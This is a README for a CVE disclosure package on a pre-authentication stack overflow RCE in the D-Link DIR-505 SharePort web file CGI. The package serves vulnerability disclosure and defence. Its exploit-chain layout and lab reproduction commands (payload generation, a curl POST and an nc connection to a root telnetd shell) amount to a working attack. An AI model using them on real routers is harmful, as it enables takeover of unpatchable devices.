# CVE Submission Materials — DIR-505 SharePort `webfile_cgi.cgi` Pre-Auth Stack Overflow RCE

**D-Link DIR-505 A1 FW 1.10B02 — unauthenticated root RCE via SharePort "Web File Access" on TCP/8181**

> Status (2026-10-14, closed loop): full RCE verified on emulation (FirmAE) ✅ and on real
> hardware (researcher-owned device, SharePort build `0107`) ✅. Submission materials complete.

---

## 1. Summary

`webfile_cgi.cgi` (SharePort Web File Access, served by lighttpd-ws and running as **root** on
**TCP/8181**) parses POST bodies with `get_input_entries()`, which performs unbounded writes into
a fixed 53,052-byte stack buffer. A ~1.1 KB unauthenticated POST overwrites `main()`'s saved
`$s0-$s4` and `$ra`; redirecting `$ra` to the `.system` PLT stub turns the parser overflow into
arbitrary command execution as root (pre-authentication RCE).

| Item | Value |
|---|---|
| Product | D-Link DIR-505 A1 (SharePort Mobile Companion) |
| Firmware | 1.10B02 (`DIR-505_A1_FW110B02.bin`, MD5 `cd13a30e3f971c23eace3ae94380f28b`) |
| Component | `/usr/bin/webfile_cgi.cgi` (MD5 `28cb86cc8b93ba2e4a47c6261403b5ce`) |
| Port | TCP/8181 (`remote_web_port=8181`) |
| Class | CWE-121 stack buffer overflow -> pre-auth RCE as root |
| CVSS 3.1 | 9.8 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Vendor status | EOL/EOS (D-Link SAP10355, no fix; vendor reply 2026-10-14) |

## 2. Exploit chain

```
POST /dws/api/ListRoot   (any /dws/api/* path works; no session required)
Content-Type: application/x-www-form-urlencoded
body = "x=0<cmd>" + "&"*49 + "a=" + value[1051]
       value = [0x00] + "A"*1026 + $s0 + $s1 + $s2 + $s3 + $s4 + $ra
       $ra = 0x40d180 (.system PLT stub)
   |- get_input_entries(): stride 1061, no bounds check -> overwrites main()'s frame
   |- on main()'s return $a0 = &field0_value + 1 = <cmd>  (uClibc strcmp delay-slot effect)
   '- jr $ra -> .system stub -> system(<cmd>) executed as root
```

- The command must not contain raw `&`, `=`, `%` (form parser / decoder limitations):
  encode them as `%26`, `%3D`, `%25`.
- The CGI's PATH is `/usr/local/bin:/usr/bin:/sbin:/bin` (no `/usr/sbin`): use absolute
  paths for binaries such as `/usr/sbin/telnetd`.

## 3. Directory layout

```
CVE_webfile_cgi_rce/
├── README.md                     <- this file
├── analysis/
│   └── stack_layout.md           <- stack frame, parser math, exploit layout
├── report/
│   ├── Vulnerability_Report.md   <- full technical report (English)
│   ├── suggested_cve_description.txt
│   ├── vuldb_submission_fields.md
│   └── vendor_email_dlink_webfile_rce.txt   <- report email to D-Link (same thread)
├── poc/
│   ├── gen_poc.py                <- payload generator
│   ├── exploit.sh                <- one-shot runner
│   ├── run_cmd.sh                <- run one command as root and fetch its output
│   ├── verify_device.sh          <- one-shot proof + automatic cleanup
│   ├── telnet_shell.py           <- minimal telnet client (for the root shell)
│   └── payloads/
│       ├── poc_1.10B02_control_deadbeef.bin    (1102 B, gdb control proof)
│       ├── poc_1.10B02_qemu_user_rce.bin       (local QEMU RCE proof)
│       ├── poc_1.10B02_emulator_rce.bin        (emulator root-shell proof)
│       └── poc_1.10B02_emulator_first_proof.bin
└── evidence/
    ├── 01_gdb_control_1.10B02.txt      <- PC=RA=0xdeadbeef, $s0-$s4 controlled
    ├── 02_local_qemu_user_rce.txt      <- local QEMU command execution proof
    ├── 03_http_response_headers.txt    <- emulator HTTP response (500 signature)
    ├── 04_serial_verification.txt      <- /tmp/webfile_proof + telnetd 2338
    ├── 05_telnet_root_shell.txt        <- root shell session
    ├── 06_get_ws_entries_and_cookie_boundary.txt  <- GET/Cookie boundary tests
    ├── 07_create_wsinfo_info_leak.txt  <- pre-auth information disclosure
    ├── 08_components_hashes.txt        <- firmware/component hashes and config
    ├── 09_real_device_verification_raw_DO_NOT_PUBLISH.txt
    └── 09_real_device_verification_redacted.txt
```

## 4. Reproduction (lab)

```bash
# 1) build and send the PoC (target = DIR-505 1.10B02, emulated or real hardware)
python3 poc/gen_poc.py --out /tmp/poc.bin \
  "/usr/sbin/telnetd -p 2338 -l /bin/sh </dev/null >/dev/null 2>%261 %26 kill -9 \$PPID"
curl -s -X POST 'http://<target>:8181/dws/api/ListRoot' \
  -H 'Content-Type: application/x-www-form-urlencoded' --data-binary @/tmp/poc.bin
# expected: HTTP 500 (the CGI is killed by the command after system() ran)
# 2) connect to the root shell
nc <target> 2338
```

## 5. Secondary issues (same binary, included in the report)

1. **Cookie overflow** (`check_4session_uid`, ~10.6 KB Cookie overwrites `$ra`) - same root cause
   as CVE-2016-5681 (VU#332115, fixed for other D-Link models in 2016; never fixed for the DIR-505).
2. **GET query overflow** (`get_ws_entries`: `strcpy(v15[1024], QUERY_STRING)`, `decode -> v16[1024]`).
3. **Pre-auth information disclosure**: POST `x=create_wsinfo` prints the Web File Access users.

## 6. Deduplication summary

- No CVE or public exploit was found for the **form-parser overflow** (`get_input_entries`) -
  this is the primary submission item.
- CVE-2016-5681 covers the *cookie* overflow on the same component (other models only); it is
  referenced as "same root cause, never fixed for DIR-505".
- Other similar CVEs (2018-9032 / 2020-13782 / 2026-8272 etc.) affect different products or
  different bug classes and do not conflict.

## 7. Submission checklist

- [ ] Send `report/vendor_email_dlink_webfile_rce.txt` in the existing vendor thread
      (satisfies the "vendor contacted" prerequisite for the CVE request).
- [ ] Submit to VulDB using `report/vuldb_submission_fields.md` (check "Request a CVE").
- [ ] Publish the GitHub package (sanitized; prepared as `GITHUB_dir505-webfile-rce/`).
- [ ] Planned public release: 2027-01-10 (90-day coordinated disclosure; may be moved earlier
      since the vendor confirmed there is no fix).
